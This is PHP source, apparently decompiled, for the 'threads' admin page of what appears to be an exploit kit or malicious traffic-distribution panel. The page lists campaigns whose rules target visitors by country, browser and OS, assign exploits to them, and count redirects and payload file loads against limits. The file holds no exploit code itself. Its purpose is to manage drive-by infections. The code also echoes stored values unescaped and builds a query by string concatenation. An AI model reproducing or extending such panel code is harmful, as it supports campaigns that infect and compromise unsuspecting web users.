<?php 
if( !defined("ADMIN_LOADED") ) 
{
    exit();
}

define("PAGE", "threads");
$imgPath = Config::get("AdminScriptName") . "?" . Config::get("MainParamName") . "=file&type=img&file=";
echo "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"\r\n\t\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n<head>\r\n\t<title>";
echo Lang::get("MenuThreadsButton");
echo "</title>\r\n\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/>\r\n\t<link rel=\"stylesheet\" href=\"";
echo Config::get("AdminScriptName");
echo "?";
echo Config::get("MainParamName");
echo "=file&type=css&file=main.css\" type=\"text/css\" media=\"screen\" />\r\n</head>\r\n<body>\r\n\t<div class=\"title\">\r\n\t\t<ul>\r\n\t\t\t<li class=\"logo\"><a href=\"";
echo Config::get("AdminScriptName");
echo "\"><img src=\"";
echo $imgPath;
echo "logo.gif\" width=\"15px\" height=\"15px\"/></a></li>\r\n\t\t\t<li><a href=\"";
echo Config::get("AdminScriptName");
echo "\">";
echo Lang::get("MenuMainButton");
echo "</a></li>\r\n\t\t\t<li><a href=\"";
echo Config::get("AdminScriptName");
echo "?";
echo Config::get("MainParamName");
echo "=files\">";
echo Lang::get("MenuFilesButton");
echo "</a></li>\r\n\t\t\t<li><a href=\"";
echo Config::get("AdminScriptName");
echo "?";
echo Config::get("MainParamName");
echo "=secur\">";
echo Lang::get("MenuSecurityButton");
echo "</a></li>\r\n\t\t</ul>\r\n\t\t<div class=\"controls\">\r\n\t\t\t<ul>\r\n\t\t\t\t<li class=\"edit\"><a href=\"";
echo Config::get("AdminScriptName");
echo "?";
echo Config::get("MainParamName");
echo "=prefs\"><img src=\"";
echo $imgPath;
echo "edit.gif\" width=\"7px\" height=\"7px\"/></a></li>\r\n\t\t\t\t<li class=\"logout\"><a href=\"";
echo Config::get("AdminScriptName");
echo "?";
echo Config::get("MainParamName");
echo "=logout\"><img src=\"";
echo $imgPath;
echo "logout.gif\" width=\"6px\" height=\"10px\"/></a></li>\r\n\t\t\t</ul>\r\n\t\t</div>\r\n\t\t<div style=\"clear:both;\"></div>\r\n\t</div>\r\n\t";
$threadData = Threads::getfulldata();
$osKeys = array_keys(Browser::$OSList);
$count = count($threadData);
foreach( $threadData as $thread ) 
{
    $title = $thread["Title"];
    $threadId = $thread["ID"];
    $rules = $thread["Rules"];
    echo "\t\t<div class=\"thread\">\r\n\t\t\t<div class=\"thread_head\">\r\n\t\t\t\t<div class=\"thread_title\">";
    echo $title;
    echo "</div>\r\n\t\t\t\t";
    if( $threadId != 1 ) 
    {
        echo "\t\t\t\t\t<div class=\"thread_control\"><a href=\"";
        echo Config::get("AdminScriptName");
        echo "?";
        echo Config::get("MainParamName");
        echo "=delThread&threadId=";
        echo $threadId;
        echo "\"><img src=\"";
        echo $imgPath;
        echo "close.gif\" width=\"11px\" height=\"11px\"/></a></div>\r\n\t\t\t\t";
    }

    echo "\t\t\t\t<div class=\"thread_control\"><a href=\"";
    echo Config::get("AdminScriptName");
    echo "?threadID=";
    echo $threadId;
    echo "\"><img src=\"";
    echo $imgPath;
    echo "stat.gif\" width=\"11px\" height=\"11px\"/></a></div>\r\n\t\t\t\t<div style=\"clear:both;\"></div>\r\n\t\t\t\t<input readonly=\"readonly\" type=\"text\" value=\"http://";
    echo $_SERVER["HTTP_HOST"];
    echo substr($_SERVER["REQUEST_URI"], 0, strpos($_SERVER["REQUEST_URI"], Config::get("AdminScriptName")) - 1);
    echo "/";
    echo Config::get("MainFileName");
    echo ".php?";
    echo Config::get("StatParamName");
    echo "=";
    echo $thread["Url"];
    echo "\"/>\r\n\t\t\t</div>\r\n\t\t\t";
    foreach( $rules as $k => $t ) 
    {
        $uid = $t["ID"];
        $first = true;
        if( 0 < $t["filesCount"] ) 
        {
            foreach( $t["FilesSplit"] as $arr ) 
            {
                $limit = db::selectone("FileLimit", "Files", "ID = " . $arr["ID"]);
                $curLimit = Threads::findfile($arr["ID"], $title);
                if( $limit != 0 - 1 ) 
                {
                    $percent = (1 * ($limit - $curLimit)) / $limit;
                }
                else
                {
                    $curLimit = abs($curLimit) - 1;
                    $percent = 0;
                }

                if( $percent < 1 ) 
                {
                    $first = false;
                }

            }
        }

        if( 0 < $t["redirectCount"] ) 
        {
            foreach( $t["RedirectsSplit"] as $arr ) 
            {
                $limit = $arr["Limit"];
                if( $limit != 0 - 1 ) 
                {
                    $curLimit = Threads::findredirect($arr["ID"]);
                    $percent = (1 * ($limit - $curLimit)) / $limit;
                }
                else
                {
                    $curLimit = abs(Threads::findredirect($arr["ID"])) - 1;
                    $percent = 0;
                }

                if( $percent < 1 ) 
                {
                    $first = false;
                }

            }
        }

        echo "\t\t\t\t<div class=\"rule";
        if( $k % 2 ) 
        {
            echo " odd";
        }

        if( $first ) 
        {
            echo " doned";
        }

        if( !$t["Active"] ) 
        {
            echo " paused";
        }

        echo "\">\r\n\t\t\t\t\t<div class=\"rule_head\">\r\n\t\t\t\t\t\t<div class=\"rule_marker\"></div>\r\n\t\t\t\t\t\t<div class=\"rule_title\">";
        echo $t["Title"];
        echo "</div>\r\n\t\t\t\t\t\t";
        if( $t["Title"] != "default" ) 
        {
            echo "\t\t\t\t\t\t\t<div class=\"thread_control\"><a href=\"";
            echo Config::get("AdminScriptName");
            echo "?";
            echo Config::get("MainParamName");
            echo "=delRule&ruleId=";
            echo $t["ID"];
            echo "\"><img src=\"";
            echo $imgPath;
            echo "close.gif\" width=\"11px\" height=\"11px\"/></a></div>\r\n\t\t\t\t\t\t";
        }

        echo "\t\t\t\t\t\t<div class=\"thread_control\"><a href=\"";
        echo Config::get("AdminScriptName");
        echo "?threadID=";
        echo $threadId;
        echo "&ruleID=";
        echo $uid;
        echo "\"><img src=\"";
        echo $imgPath;
        echo "stat.gif\" width=\"11px\" height=\"11px\"/></a></div>\r\n\t\t\t\t\t\t";
        if( $t["Title"] != "default" ) 
        {
            echo "\t\t\t\t\t\t\t";
            if( $t["Active"] ) 
            {
                echo "\t\t\t\t\t\t\t\t<div class=\"thread_control\"><a href=\"";
                echo Config::get("AdminScriptName");
                echo "?";
                echo Config::get("MainParamName");
                echo "=playPauseRule&ruleID=";
                echo $t["ID"];
                echo "&state=0\"><img src=\"";
                echo $imgPath;
                echo "play.gif\" width=\"16px\" height=\"11px\"/></a></div>\r\n\t\t\t\t\t\t\t";
            }
            else
            {
                echo "\t\t\t\t\t\t\t\t<div class=\"thread_control\"><a href=\"";
                echo Config::get("AdminScriptName");
                echo "?";
                echo Config::get("MainParamName");
                echo "=playPauseRule&ruleID=";
                echo $t["ID"];
                echo "&state=1\"><img src=\"";
                echo $imgPath;
                echo "pause.gif\" width=\"16px\" height=\"11px\"/></a></div>\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t";
            }

            echo "\t\t\t\t\t\t";
        }

        echo "\t\t\t\t\t\t";
        if( $k < count($rules) - 2 ) 
        {
            echo "\t\t\t\t\t\t\t<div class=\"thread_control\"><a href=\"";
            echo Config::get("AdminScriptName");
            echo "?";
            echo Config::get("MainParamName");
            echo "=moveRuleDown&ruleID=";
            echo $t["ID"];
            echo "\"><img src=\"";
            echo $imgPath;
            echo "down.gif\" width=\"11px\" height=\"11px\"/></a></div>\r\n\t\t\t\t\t\t";
        }

        echo "\t\t\t\t\t\t";
        if( 0 < $k && $k != count($rules) - 1 ) 
        {
            echo "\t\t\t\t\t\t\t<div class=\"thread_control\"><a href=\"";
            echo Config::get("AdminScriptName");
            echo "?";
            echo Config::get("MainParamName");
            echo "=moveRuleUp&ruleID=";
            echo $t["ID"];
            echo "\"><img src=\"";
            echo $imgPath;
            echo "up.gif\" width=\"11px\" height=\"11px\"/></a></div>\r\n\t\t\t\t\t\t";
        }

        echo "\t\t\t\t\t\t<div style=\"clear:both;\"></div>\r\n\t\t\t\t\t</div>\r\n\t\t\t\t\t<div style=\"clear:both;\"></div>\r\n\t\t\t\t\t<div class=\"rule_content\">\r\n\t\t\t\t\t\t";
        if( 0 < $t["countryCount"] ) 
        {
            echo "\t\t\t\t\t\t\t<div class=\"block_title\">";
            echo Lang::get("StatisticsCountriesLabel");
            echo ":</div>\r\n\t\t\t\t\t\t\t";
            $arr = array(  );
            foreach( $t["CountriesSplit"] as $id ) 
            {
                $arr[] = Browser::$countryNames[$id];
            }
            echo implode(", ", $arr);
            echo "\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t";
        }

        echo "\t\t\t\t\t\t";
        if( 0 < $t["browserCount"] ) 
        {
            echo "\t\t\t\t\t\t\t<div class=\"block_title\">";
            echo Lang::get("StatisticsBrowsersLabel");
            echo ":</div>\r\n\t\t\t\t\t\t\t";
            $arr = array(  );
            foreach( $t["BrowsersSplit"] as $id ) 
            {
                $arr[] = Browser::$browsers[$id];
            }
            echo implode(", ", $arr);
            echo "\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t";
        }

        echo "\t\t\t\t\t\t";
        if( 0 < $t["osCount"] ) 
        {
            echo "\t\t\t\t\t\t\t<div class=\"block_title\">";
            echo Lang::get("StatisticsOSLabel");
            echo ":</div>\r\n\t\t\t\t\t\t\t";
            $arr = array(  );
            foreach( $t["OsesSplit"] as $id ) 
            {
                $arr[] = $osKeys[$id];
            }
            echo implode(", ", $arr);
            echo "\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t";
        }

        echo "\t\t\t\t\t\t";
        if( 0 < $t["exploitCount"] ) 
        {
            echo "\t\t\t\t\t\t\t<div class=\"block_title\">";
            echo Lang::get("StatisticsExploitsLabel");
            echo ":</div>\r\n\t\t\t\t\t\t\t";
            $arr = array(  );
            foreach( $t["ExploitsSplit"] as $id ) 
            {
                $arr[] = Browser::$exploits[$id];
            }
            echo implode(", ", $arr);
            echo "\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t";
        }

        echo "\t\t\t\t\t\t";
        if( 0 < $t["redirectCount"] ) 
        {
            echo "\t\t\t\t\t\t\t<div class=\"block_title\">";
            echo Lang::get("StatisticsRedirectsLabel");
            echo ":</div>\r\n\t\t\t\t\t\t\t";
            $first = true;
            foreach( $t["RedirectsSplit"] as $arr ) 
            {
                $title = $arr["Title"];
                $limit = $arr["Limit"];
                if( $limit != 0 - 1 ) 
                {
                    $curLimit = Threads::findredirect($arr["ID"]);
                    $percent = (1 * ($limit - $curLimit)) / $limit;
                }
                else
                {
                    $curLimit = abs(Threads::findredirect($arr["ID"])) - 1;
                    $percent = 0;
                }

                $fileName = $title;
                $id = $arr["ID"];
                $short = $title;
                if( 25 < strlen($short) ) 
                {
                    $short = substr($short, 0, 15) . "..." . substr($short, 0 - 10);
                }

                echo "\t\t\t\t\t\t\t\t<div class=\"file";
                if( $percent == 1 ) 
                {
                    echo " past";
                }
                else
                {
                    if( $first && ($percent < 1 || $limit == 0 - 1) ) 
                    {
                        echo " active";
                    }
                    else
                    {
                        echo " future";
                    }

                }

                echo "\">\r\n\t\t\t\t\t\t\t\t\t<div class=\"file_marker\"></div>\r\n\t\t\t\t\t\t\t\t\t<div class=\"file_title\">";
                echo $short;
                echo "</div>\r\n\t\t\t\t\t\t\t\t\t<div class=\"file_loads\">";
                if( $limit != 0 - 1 ) 
                {
                    echo "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t";
                    echo $limit - $curLimit;
                    echo " ";
                    echo Lang::get("From");
                    echo " ";
                    echo $limit;
                    echo "\t\t\t\t\t\t\t\t\t\t\t\t\t\t";
                }
                else
                {
                    echo "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t";
                    echo $curLimit;
                    echo " ";
                    echo Lang::get("From");
                    echo " &#8734;\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t";
                }

                echo "\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t<div style=\"clear:both;\"></div>\r\n\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t<div style=\"clear:both;\"></div>\r\n\t\t\t\t\t\t\t\t";
                if( $percent < 1 ) 
                {
                    $first = false;
                }

                echo "\t\t\t\t\t\t\t";
            }
            echo "\t\t\t\t\t\t";
        }

        echo "\t\t\t\t\t\t";
        if( 0 < $t["filesCount"] ) 
        {
            echo "\t\t\t\t\t\t\t<div class=\"block_title\">";
            echo Lang::get("StatisticsFilesLabel");
            echo ":</div>\r\n\t\t\t\t\t\t\t";
            $first = true;
            foreach( $t["FilesSplit"] as $arr ) 
            {
                $title = $arr["Title"];
                $id = $arr["ID"];
                $limit = db::selectone("FileLimit", "Files", "ID = " . $arr["ID"]);
                $curLimit = Threads::findfile($arr["ID"], $title);
                if( $limit != 0 - 1 ) 
                {
                    $percent = (1 * ($limit - $curLimit)) / $limit;
                }
                else
                {
                    $curLimit = abs($curLimit) - 1;
                    $percent = 0;
                }

                $fileName = $title;
                $short = $title;
                if( 25 < strlen($short) ) 
                {
                    $short = substr($short, 0, 15) . "..." . substr($short, 0 - 10);
                }

                echo "\t\t\t\t\t\t\t\t<div class=\"file";
                if( $percent == 1 ) 
                {
                    echo " past";
                }
                else
                {
                    if( $first && ($percent < 1 || $limit == 0 - 1) ) 
                    {
                        echo " active";
                    }
                    else
                    {
                        echo " future";
                    }

                }

                echo "\">\r\n\t\t\t\t\t\t\t\t\t<div class=\"file_marker\"></div>\r\n\t\t\t\t\t\t\t\t\t<div class=\"file_title\">";
                echo $short;
                echo "</div>\r\n\t\t\t\t\t\t\t\t\t<div class=\"file_loads\">";
                if( $limit != 0 - 1 ) 
                {
                    echo "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t";
                    echo $limit - $curLimit;
                    echo " ";
                    echo Lang::get("From");
                    echo " ";
                    echo $limit;
                    echo "\t\t\t\t\t\t\t\t\t\t\t\t\t\t";
                }
                else
                {
                    echo "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t";
                    echo $curLimit;
                    echo " ";
                    echo Lang::get("From");
                    echo " &#8734;\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t";
                }

                echo "\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t<div style=\"clear:both;\"></div>\r\n\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t<div style=\"clear:both;\"></div>\r\n\t\t\t\t\t\t\t\t";
                if( $percent < 1 ) 
                {
                    $first = false;
                }

                echo "\t\t\t\t\t\t\t";
            }
            echo "\t\t\t\t\t\t";
        }

        echo "\t\t\t\t\t\t\r\n\t\t\t\t\t\t<div class=\"block_title\">";
        echo Lang::get("StatisticsTrafficLabel");
        echo ":</div>\r\n\t\t\t\t\t\t";
        $text = "";
        switch( $t["TrafficType"] ) 
        {
            case 0:
                $text = Lang::get("ForAll");
                break;
            case 1:
                $text = Lang::get("ForHits");
                break;
            case 2:
                $text = Lang::get("ForHosts");
        }
        echo $text;
        echo "\t\t\t\t\t</div>\r\n\t\t\t\t</div>\r\n\t\t\t";
    }
    echo "\t\t</div>\r\n\t\t\r\n\t";
}
echo "\r\n</body>\r\n</html>";

